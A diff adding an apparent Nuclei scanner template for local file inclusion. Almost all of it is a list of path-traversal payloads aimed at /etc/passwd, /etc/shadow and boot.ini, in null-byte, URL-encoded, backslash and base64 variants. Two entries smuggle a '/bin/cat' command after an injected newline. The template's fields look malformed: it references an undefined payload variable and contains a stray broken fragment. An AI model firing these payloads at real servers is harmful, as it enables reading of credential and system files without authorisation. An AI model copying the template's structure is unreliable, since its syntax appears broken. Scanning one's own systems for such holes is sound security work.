@@ -1,0 +1,114 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: lfi-03
+info:
+  name: LFI on Parameter
+  author: unknown
+  severity: info
+
+variables:
+  - dest: |
+      /.../.../.../.../.../
+      \…..\\\…..\\\…..\\\
+      %00../../../../../../etc/passwd
+      %00/etc/passwd%00
+      %00../../../../../../etc/shadow
+      %00/etc/shadow%00
+      %0a/bin/cat%20/etc/passwd
+      %0a/bin/cat%20/etc/shadow
+      %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+      %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
+      %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+      %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..etc/passwd
+      /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..etc/passwd
+      ../../../../../../../../%2Aetc/passwd
+      ../../../../../../../../etc/passwd
+      /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+      /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+      /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+      ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+      ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+      ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+      ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+      ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+      =3D “/..” . “%2f..
+      ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+      /./././././././././././etc/shadow
+      /../../../../../../../../../../etc/shadow
+      /../../../../../../../../../../etc/shadow^^
+      /..\../..\../..\../..\../..\../..\../etc/shadow
+      ../../../../../../../../../../../../etc/shadow
+      ..\..\..\..\..\..\..\..\..\..\etc\shadow
+      .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+      \..\..\..\..\..\..\..\..\..\..\etc\shadow
+      ../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00
+      ../../../../../../../../../../../../etc/shadow%00
+      ..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+      \..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+      ..2fetc2fpasswd
+      ..2fetc2fpasswd%00
+      ..2f..2fetc2fpasswd
+      ..2f..2fetc2fpasswd%00
+      ..2f..2f..2fetc2fpasswd
+      ..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+      ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00
+      L2V0Yy9tYXN0ZXIucGFzc3dk
+      L21hc3Rlci5wYXNzd2Q=
+      ZXRjL3Bhc3N3ZA==
+      ZXRjL3NoYWRvdyUwMA==
+      L2V0Yy9wYXNzd2Q=
+      L2V0Yy9wYXNzd2QlMDA=
+      Li4vZXRjL3Bhc3N3ZA==
+      Li4vZXRjL3Bhc3N3ZCUwMA==
+      Li4vLi4vZXRjL3Bhc3N3ZA==
+      Li4vLi4vZXRjL3Bhc3N3ZCUwMA==
+      Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
+      Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+      Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+      Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+      Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+
+# origin: gonna come from Burp
+payloads:
+    - '{{.dest}}'
+
+http:
+  - generators:
+      - Query("{{.payload}}", "*")
